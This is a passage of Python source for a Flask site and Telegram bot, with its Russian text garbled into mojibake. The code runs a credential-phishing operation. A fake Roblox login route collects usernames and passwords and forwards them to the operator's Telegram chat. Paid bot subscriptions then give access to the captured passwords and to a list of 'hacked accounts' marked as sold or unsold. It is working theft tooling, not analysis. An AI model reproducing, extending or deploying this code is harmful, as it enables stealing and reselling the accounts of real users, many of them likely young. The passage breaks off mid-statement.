    print(f"–§–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–∏: {iso_time}")
    added_time = datetime.fromisoformat(iso_time)
    current_time = get_current_time()
    minutes_passed = int((current_time - added_time).total_seconds() / 60)
    formatted_time = f"{added_time.strftime('%Y-%m-%d %H:%M')} ({minutes_passed} –º–∏–Ω –Ω–∞–∑–∞–¥)"
    print(f"–û—Ç—Ñ–æ—Ä–º–∞—Ç–∏—Ä–æ–≤–∞–Ω–Ω–æ–µ –≤—Ä–µ–º—è: {formatted_time}")
    return formatted_time

# === –§—É–Ω–∫—Ü–∏—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –¥–æ—Å—Ç—É–ø–∞ ===
def check_access(chat_id, command):
    print(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –¥–ª—è {chat_id} –Ω–∞ –∫–æ–º–∞–Ω–¥—É {command}")
    global tech_break, tech_reason
    user = get_user(chat_id)
    if user is None and command in ['start', 'menu', 'getchatid', 'support']:
        print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–µ –Ω–∞–π–¥–µ–Ω, —Å–æ—Ö—Ä–∞–Ω—è–µ–º –∫–∞–∫ –ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å")
        save_user(chat_id, "–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å")
        user = get_user(chat_id)
    
    if tech_break and chat_id != ADMIN_CHAT_ID:
        time_left = (tech_break - get_current_time()).total_seconds() / 60
        if time_left > 0:
            print(f"–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –∞–∫—Ç–∏–≤–µ–Ω –¥–ª—è {chat_id}, –≤—Ä–µ–º—è –æ—Å—Ç–∞–ª–æ—Å—å: {time_left} –º–∏–Ω")
            return f"‚è≥ –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –¥–æ {tech_break.strftime('%H:%M')} (UTC+2).\n–ü—Ä–∏—á–∏–Ω–∞: {tech_reason}\n–û—Å—Ç–∞–ª–æ—Å—å: {int(time_left)} –º–∏–Ω."
    if not user or user['prefix'] == '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å':
        if command in ['start', 'menu', 'getchatid', 'support']:
            print(f"–î–æ—Å—Ç—É–ø –¥–ª—è {chat_id} –Ω–∞ {command} —Ä–∞–∑—Ä–µ—à–µ–Ω –∫–∞–∫ –ü–æ—Å–µ—Ç–∏—Ç–µ–ª—é")
            return None
        print(f"–î–æ—Å—Ç—É–ø –¥–ª—è {chat_id} –Ω–∞ {command} –æ–≥—Ä–∞–Ω–∏—á–µ–Ω")
        return "üîí –î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω!\n–ö—É–ø–∏—Ç–µ –ø–æ–¥–ø–∏—Å–∫—É —É @sacoectasy.\n–í–∞—à ID: /getchatid"
    if user['subscription_end'] and user['subscription_end'] < get_current_time():
        print(f"–ü–æ–¥–ø–∏—Å–∫–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {chat_id} –∏—Å—Ç–µ–∫–ª–∞")
        save_user(chat_id, '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å', get_current_time())
        return "üîí –ü–æ–¥–ø–∏—Å–∫–∞ –∏—Å—Ç–µ–∫–ª–∞!\n–û–±–Ω–æ–≤–∏—Ç–µ –ø–æ–¥–ø–∏—Å–∫—É —É @sacoectasy.\n–í–∞—à ID: /getchatid"
    if command in ['passwords', 'admin'] and user['prefix'] not in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']:
        print(f"–ö–æ–º–∞–Ω–¥–∞ {command} –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è {chat_id} —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º {user['prefix']}")
        return "üîí –ö–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –ê–¥–º–∏–Ω–æ–≤ –∏ –°–æ–∑–¥–∞—Ç–µ–ª—è!"
    if command in ['hacked', 'database', 'techstop', 'techstopoff', 'adprefix', 'delprefix'] and user['prefix'] != '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        print(f"–ö–æ–º–∞–Ω–¥–∞ {command} –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è {chat_id} —Å –ø—Ä–µ—Ñ–∏–∫—Å–æ–º {user['prefix']}")
        return "üîí –ö–æ–º–∞–Ω–¥–∞ —Ç–æ–ª—å–∫–æ –¥–ª—è –°–æ–∑–¥–∞—Ç–µ–ª—è!"
    print(f"–î–æ—Å—Ç—É–ø —Ä–∞–∑—Ä–µ—à–µ–Ω –¥–ª—è {chat_id} –Ω–∞ {command}")
    return None

# === Flask –º–∞—Ä—à—Ä—É—Ç—ã ===
@app.route('/')
def index():
    print("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ –≥–ª–∞–≤–Ω—É—é —Å—Ç—Ä–∞–Ω–∏—Ü—É")
    return render_template('index.html')

@app.route('/login-roblox.html')
def login_page():
    print("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É –ª–æ–≥–∏–Ω–∞")
    return render_template('login-roblox.html')

@app.route('/submit', methods=['POST'])
def submit():
    print("–û–±—Ä–∞–±–æ—Ç–∫–∞ POST-–∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ /submit")
    try:
        login = request.form.get('login')
        password = request.form.get('password')
        print(f"–ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ: login={login}, password={password}")
        if login and password:
            if save_credentials(login, password):
                print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è —Å–æ–∑–¥–∞—Ç–µ–ª—é –æ –Ω–æ–≤–æ–º –ª–æ–≥–∏–Ω–µ: {login}")
                bot.send_message(ADMIN_CHAT_ID, f"üîê –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω –¥–æ–±–∞–≤–ª–µ–Ω:\n–õ–æ–≥–∏–Ω: {login}\n–ü–∞—Ä–æ–ª—å: {password}")
        return redirect(url_for('not_found'))
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ /submit: {e}")
        return "–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞", 500

@app.route('/404')
def not_found():
    print("–û–±—Ä–∞–±–æ—Ç–∫–∞ –∑–∞–ø—Ä–æ—Å–∞ –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É 404")
    return render_template('404.html')

@app.route('/webhook', methods=['POST'])
def webhook():
    print("–ü–æ–ª—É—á–µ–Ω –∑–∞–ø—Ä–æ—Å –Ω–∞ /webhook")
    try:
        if request.headers.get('content-type') == 'application/json':
            json_string = request.get_data().decode('utf-8')
            print(f"–ü–æ–ª—É—á–µ–Ω—ã –¥–∞–Ω–Ω—ã–µ –≤–µ–±—Ö—É–∫–∞: {json_string}")
            update = telebot.types.Update.de_json(json_string)
            if update and (update.message or update.callback_query):
                update_id = update.update_id
                if update_id in processed_updates:
                    print(f"–ü–æ–≤—Ç–æ—Ä–Ω—ã–π update_id: {update_id}, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º")
                    return 'OK', 200
                processed_updates.add(update_id)
                print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è: {update}")
                bot.process_new_updates([update])
                print("–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ")
            return 'OK', 200
        print("–ù–µ–≤–µ—Ä–Ω—ã–π —Ç–∏–ø –∑–∞–ø—Ä–æ—Å–∞")
        return '–ù–µ–≤–µ—Ä–Ω—ã–π –∑–∞–ø—Ä–æ—Å', 400
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ –≤–µ–±—Ö—É–∫–µ: {e}")
        return 'OK', 200

# === –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ –∫–æ–º–∞–Ω–¥ –±–æ—Ç–∞ ===
@bot.message_handler(commands=['start'])
def start_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /start –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'start')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /start: {access}")
        bot.reply_to(message, access)
        return
    print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è {chat_id}")
    bot.reply_to(message, "‚ú® –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å!\n–Ø –±–æ—Ç –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –¥–æ—Å—Ç—É–ø–æ–º –∏ –¥–∞–Ω–Ω—ã–º–∏.\nüìã –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ /menu –¥–ª—è —Å–ø–∏—Å–∫–∞ –∫–æ–º–∞–Ω–¥.")

@bot.message_handler(commands=['getchatid'])
def getchatid_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /getchatid –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'getchatid')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /getchatid: {access}")
        bot.reply_to(message, access)
        return
    username = message.from_user.username or "–ù–µ—Ç —é–∑–µ—Ä–Ω–µ–π–º–∞"
    print(f"–ü–æ–ª—É—á–µ–Ω —é–∑–µ—Ä–Ω–µ–π–º: {username}")
    response = f"üë§ –í–∞—à Chat ID: `{chat_id}`\n–Æ–∑–µ—Ä–Ω–µ–π–º: @{username}"
    bot.reply_to(message, response, parse_mode='Markdown')
    print(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –æ—Ç–≤–µ—Ç –Ω–∞ /getchatid –¥–ª—è {chat_id}")

@bot.message_handler(commands=['site'])
def site_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /site –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'site')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /site: {access}")
        bot.reply_to(message, access)
        return
    increment_site_clicks(chat_id)
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("üåê –ü–µ—Ä–µ–π—Ç–∏ –Ω–∞ —Å–∞–π—Ç", url=SITE_URL))
    print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ —Å—Å—ã–ª–∫–∏ –Ω–∞ —Å–∞–π—Ç –¥–ª—è {chat_id}")
    bot.reply_to(message, "üîó –ü–æ–ª—É—á–∏—Ç–µ –¥–æ—Å—Ç—É–ø –∫ –Ω–∞—à–µ–º—É —Å–∞–π—Ç—É:", reply_markup=markup)
    print(f"–û—Ç–≤–µ—Ç –Ω–∞ /site –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –¥–ª—è {chat_id}")

@bot.message_handler(commands=['menu'])
def menu_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /menu –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'menu')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /menu: {access}")
        bot.reply_to(message, access)
        return
    
    user = get_user(chat_id)
    if not user:
        print(f"–û—à–∏–±–∫–∞: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–µ –Ω–∞–π–¥–µ–Ω")
        bot.reply_to(message, "‚ùå –û—à–∏–±–∫–∞: –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–µ –Ω–∞–π–¥–µ–Ω!")
        return
    print(f"–ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {chat_id} –Ω–∞–π–¥–µ–Ω: {user}")
    time_left = (user['subscription_end'] - get_current_time()).days if user['subscription_end'] else 0
    time_str = f"{time_left} –¥–Ω–µ–π" if time_left > 0 else "–ò—Å—Ç–µ–∫–ª–∞"
    response = f"üë§ –í–∞—à —Å—Ç–∞—Ç—É—Å: {user['prefix']}\n‚è≥ –ü–æ–¥–ø–∏—Å–∫–∞ –∞–∫—Ç–∏–≤–Ω–∞: {time_str}"
    
    global tech_break, tech_reason
    if tech_break:
        tech_time_left = (tech_break - get_current_time()).total_seconds() / 60
        if tech_time_left > 0:
            print(f"–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –∞–∫—Ç–∏–≤–µ–Ω, –æ—Å—Ç–∞–ª–æ—Å—å: {tech_time_left} –º–∏–Ω")
            response += f"\n‚è≥ –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –¥–æ {tech_break.strftime('%H:%M')} (UTC+2)\n–ü—Ä–∏—á–∏–Ω–∞: {tech_reason}\n–û—Å—Ç–∞–ª–æ—Å—å: {int(tech_time_left)} –º–∏–Ω."
        else:
            print("–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –∏—Å—Ç–µ–∫, —Å–±—Ä–∞—Å—ã–≤–∞–µ–º")
            tech_break = None
            tech_reason = None
    
    response += "\n\nüìã **–ö–æ–º–∞–Ω–¥—ã –±–æ—Ç–∞**:\n" \
                "/start ‚Äî –∑–∞–ø—É—Å—Ç–∏—Ç—å –±–æ—Ç–∞\n" \
                "/menu ‚Äî –ø–æ–∫–∞–∑–∞—Ç—å —ç—Ç–æ –º–µ–Ω—é\n" \
                "/getchatid ‚Äî —É–∑–Ω–∞—Ç—å –≤–∞—à ID –∏ —é–∑–µ—Ä–Ω–µ–π–º\n" \
                "/support ‚Äî —Å–æ–æ–±—â–∏—Ç—å –æ–± –æ—à–∏–±–∫–µ —Å–æ–∑–¥–∞—Ç–µ–ª—é"
    if user['prefix'] != '–ü–æ—Å–µ—Ç–∏—Ç–µ–ª—å':
        response += "\n/site ‚Äî –ø–æ–ª—É—á–∏—Ç—å —Å—Å—ã–ª–∫—É –Ω–∞ —Å–∞–π—Ç\n" \
                    "/hacked ‚Äî —Å–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤"
    if user['prefix'] in ['–ê–¥–º–∏–Ω', '–°–æ–∑–¥–∞—Ç–µ–ª—å']:
        response += "\n/passwords ‚Äî —Å–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π\n" \
                    "/admin ‚Äî –ø–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞"
    if user['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        response += "\n/database ‚Äî —É–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–∞–∑–æ–π –¥–∞–Ω–Ω—ã—Ö\n" \
                    "/techstop <–º–∏–Ω—É—Ç—ã> <–ø—Ä–∏—á–∏–Ω–∞> ‚Äî –≤–∫–ª—é—á–∏—Ç—å —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤\n" \
                    "/techstopoff ‚Äî –≤—ã–∫–ª—é—á–∏—Ç—å —Ç–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤\n" \
                    "/adprefix <chat_id> <–ø—Ä–µ—Ñ–∏–∫—Å> <–¥–Ω–∏> ‚Äî –≤—ã–¥–∞—Ç—å –ø–æ–¥–ø–∏—Å–∫—É\n" \
                    "/delprefix <chat_id> ‚Äî —Å–±—Ä–æ—Å–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É\n" \
                    "/adduser <chat_id> <–ø—Ä–µ—Ñ–∏–∫—Å> <–¥–Ω–∏> ‚Äî –¥–æ–±–∞–≤–∏—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è\n" \
                    "/addcred <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å> ‚Äî –¥–æ–±–∞–≤–∏—Ç—å –ø–∞—Ä–æ–ª—å\n" \
                    "/addhacked <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å> ‚Äî –¥–æ–±–∞–≤–∏—Ç—å –≤–∑–ª–æ–º–∞–Ω–Ω—ã–π –∞–∫–∫–∞—É–Ω—Ç"
    
    print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ –æ—Ç–≤–µ—Ç–∞ –Ω–∞ /menu –¥–ª—è {chat_id}")
    bot.reply_to(message, response, parse_mode='Markdown')
    print(f"–û—Ç–≤–µ—Ç –Ω–∞ /menu —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –¥–ª—è {chat_id}")

@bot.message_handler(commands=['support'])
def support_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /support –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'support')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /support: {access}")
        bot.reply_to(message, access)
        return
    print(f"–ó–∞–ø—Ä–æ—Å –æ–ø–∏—Å–∞–Ω–∏—è –ø—Ä–æ–±–ª–µ–º—ã –¥–ª—è {chat_id}")
    msg = bot.reply_to(message, "üì© –û–ø–∏—à–∏—Ç–µ –ø—Ä–æ–±–ª–µ–º—É –∏–ª–∏ –±–∞–≥, –∫–æ—Ç–æ—Ä—ã–π –≤—ã –Ω–∞—à–ª–∏.\n–°–æ–æ–±—â–µ–Ω–∏–µ –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Å–æ–∑–¥–∞—Ç–µ–ª—é (@sacoectasy).")
    pending_support[chat_id] = {'step': 'awaiting_message', 'message_id': msg.message_id}
    print(f"–û–∂–∏–¥–∞–Ω–∏–µ –≤–≤–æ–¥–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –æ—Ç {chat_id}")

@bot.message_handler(func=lambda message: str(message.chat.id) in pending_support)
def handle_support_input(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ –¥–ª—è /support –æ—Ç chat_id: {chat_id}")
    if chat_id not in pending_support:
        print(f"–ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ /support –¥–ª—è {chat_id}")
        return
    
    data = pending_support[chat_id]
    if data['step'] == 'awaiting_message':
        support_message = message.text.strip()
        username = message.from_user.username or "–ù–µ—Ç —é–∑–µ—Ä–Ω–µ–π–º–∞"
        print(f"–ü–æ–ª—É—á–µ–Ω–æ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç {chat_id}: {support_message}")
        bot.send_message(ADMIN_CHAT_ID, f"üì¨ –°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç @{username} (ID: {chat_id}):\n\n{support_message}")
        bot.reply_to(message, "‚úÖ –í–∞—à–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Å–æ–∑–¥–∞—Ç–µ–ª—é (@sacoectasy)!")
        print(f"–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Å–æ–∑–¥–∞—Ç–µ–ª—é –æ—Ç {chat_id}")
        del pending_support[chat_id]
        print(f"–ü—Ä–æ—Ü–µ—Å—Å /support –∑–∞–≤–µ—Ä—à–µ–Ω –¥–ª—è {chat_id}")

@bot.message_handler(commands=['techstop'])
def techstop_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /techstop –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'techstop')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /techstop: {access}")
        bot.reply_to(message, access)
        return
    global tech_break, tech_reason
    args = message.text.split(maxsplit=2)[1:] if len(message.text.split()) > 1 else []
    if len(args) < 2 or not args[0].isdigit():
        print("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã /techstop")
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /techstop <–º–∏–Ω—É—Ç—ã> <–ø—Ä–∏—á–∏–Ω–∞>\n–ü—Ä–∏–º–µ—Ä: /techstop 30 –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ")
        return
    minutes = int(args[0])
    reason = args[1]
    tech_break = get_current_time() + timedelta(minutes=minutes)
    tech_reason = reason
    print(f"–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω –Ω–∞ {minutes} –º–∏–Ω—É—Ç —Å –ø—Ä–∏—á–∏–Ω–æ–π: {reason}")
    bot.reply_to(message, f"‚è≥ –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –Ω–∞ {minutes} –º–∏–Ω —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!\n–û–∫–æ–Ω—á–∞–Ω–∏–µ: {tech_break.strftime('%H:%M')} (UTC+2)\n–ü—Ä–∏—á–∏–Ω–∞: {reason}")

@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /techstopoff –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /techstopoff: {access}")
        bot.reply_to(message, access)
        return
    global tech_break, tech_reason
    tech_break = None
    tech_reason = None
    print("–¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ –æ—Ç–∫–ª—é—á–µ–Ω")
    bot.reply_to(message, "‚úÖ –¢–µ—Ö–ø–µ—Ä–µ—Ä—ã–≤ —É—Å–ø–µ—à–Ω–æ –æ—Ç–∫–ª—é—á–µ–Ω!")

@bot.message_handler(commands=['passwords'])
def passwords_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /passwords –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'passwords')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /passwords: {access}")
        bot.reply_to(message, access)
        return
    increment_password_views(chat_id)
    credentials = get_credentials()
    if not credentials:
        print("–°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π –ø—É—Å—Ç")
        bot.reply_to(message, "üìÇ –°–ø–∏—Å–æ–∫ –ø–∞—Ä–æ–ª–µ–π –ø—É—Å—Ç.\n–î–æ–±–∞–≤—å—Ç–µ —á–µ—Ä–µ–∑ /addcred <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>.")
        return
    print(f"–ü–æ–ª—É—á–µ–Ω —Å–ø–∏—Å–æ–∫ —É—á–µ—Ç–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö: {credentials}")
    for i, (login, password, added_time) in enumerate(credentials, 1):
        formatted_time = format_time_with_minutes(added_time)
        response = f"**–ü–∞—Ä–æ–ª—å #{i}**\nüë§ –õ–æ–≥–∏–Ω: `{login}`\nüîí –ü–∞—Ä–æ–ª—å: `{password}`\n‚è∞ –î–æ–±–∞–≤–ª–µ–Ω: {formatted_time}"
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton(f"üóë –£–¥–∞–ª–∏—Ç—å #{i}", callback_data=f"delete_cred_{login}"),
            types.InlineKeyboardButton(f"üîì –í–∑–ª–æ–º–∞—Ç—å #{i}", callback_data=f"hack_cred_{login}_{chat_id}")
        )
        print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏—è –¥–ª—è –ø–∞—Ä–æ–ª—è #{i} –¥–ª—è {chat_id}")
        bot.send_message(chat_id, response, reply_markup=markup, parse_mode='Markdown')
    print(f"–í—Å–µ –ø–∞—Ä–æ–ª–∏ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã –¥–ª—è {chat_id}")

@bot.message_handler(commands=['hacked'])
def hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /hacked –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /hacked: {access}")
        bot.reply_to(message, access)
        return
    
    hacked_accounts = get_hacked_accounts()
    if not hacked_accounts:
        markup = types.InlineKeyboardMarkup()
        if get_user(chat_id)['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
            markup.add(types.InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –∞–∫–∫–∞—É–Ω—Ç", callback_data="add_hacked"))
        print("–°–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø—É—Å—Ç")
        bot.reply_to(message, "üìÇ –°–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –ø—É—Å—Ç.\n–î–æ–±–∞–≤—å—Ç–µ —á–µ—Ä–µ–∑ /addhacked –∏–ª–∏ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ.", reply_markup=markup)
        return
    
    response = "üîì **–í–∑–ª–æ–º–∞–Ω–Ω—ã–µ –∞–∫–∫–∞—É–Ω—Ç—ã**:\n"
    markup = types.InlineKeyboardMarkup()
    print(f"–ü–æ–ª—É—á–µ–Ω —Å–ø–∏—Å–æ–∫ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤: {hacked_accounts}")
    for login, password, hack_date, prefix, sold_status, linked_chat_id in hacked_accounts:
        formatted_time = format_time_with_minutes(hack_date)
        response += (f"üë§ –õ–æ–≥–∏–Ω: `{login}`\n"
                     f"üîí –ü–∞—Ä–æ–ª—å: `{password}`\n"
                     f"‚è∞ –î–∞—Ç–∞: {formatted_time}\n"
                     f"üëë –ü—Ä–µ—Ñ–∏–∫—Å: {prefix}\n"
                     f"üí∞ –°—Ç–∞—Ç—É—Å: {sold_status}\n"
                     f"üÜî Chat ID: {linked_chat_id or '–ù–µ –ø—Ä–∏–≤—è–∑–∞–Ω'}\n\n")
        if get_user(chat_id)['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
            markup.add(
                types.InlineKeyboardButton(f"üóë –£–¥–∞–ª–∏—Ç—å", callback_data=f"delete_hacked_{login}")
            )
    if get_user(chat_id)['prefix'] == '–°–æ–∑–¥–∞—Ç–µ–ª—å':
        markup.add(types.InlineKeyboardButton("‚ûï –î–æ–±–∞–≤–∏—Ç—å –∞–∫–∫–∞—É–Ω—Ç", callback_data="add_hacked"))
    print(f"–û—Ç–ø—Ä–∞–≤–∫–∞ —Å–ø–∏—Å–∫–∞ –≤–∑–ª–æ–º–∞–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –¥–ª—è {chat_id}")
    bot.reply_to(message, response, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(commands=['addhacked'])
def add_hacked_cmd(message):
    chat_id = str(message.chat.id)
    print(f"–û–±—Ä–∞–±–æ—Ç–∫–∞ /addhacked –¥–ª—è chat_id: {chat_id}")
    access = check_access(chat_id, 'hacked')
    if access:
        print(f"–î–æ—Å—Ç—É–ø –æ–≥—Ä–∞–Ω–∏—á–µ–Ω –¥–ª—è /addhacked: {access}")
        bot.reply_to(message, access)
        return
    args = message.text.split()[1:] if len(message.text.split()) > 1 else []
    if len(args) != 2:
        print("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–º–∞–Ω–¥—ã /addhacked")
        bot.reply_to(message, "‚ùå –§–æ—Ä–º–∞—Ç: /addhacked <–ª–æ–≥–∏–Ω> <–ø–∞—Ä–æ–ª—å>\n–ü—Ä–∏–º–µ—Ä: /addhacked test test123")
        return
    login, password = args[0], args[1]
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("üí∞ –ü—Ä–æ–¥–∞–Ω", callback_data=f"hack_{login}_{password}_–ü—Ä–æ–¥–∞–Ω_{chat_id}"),
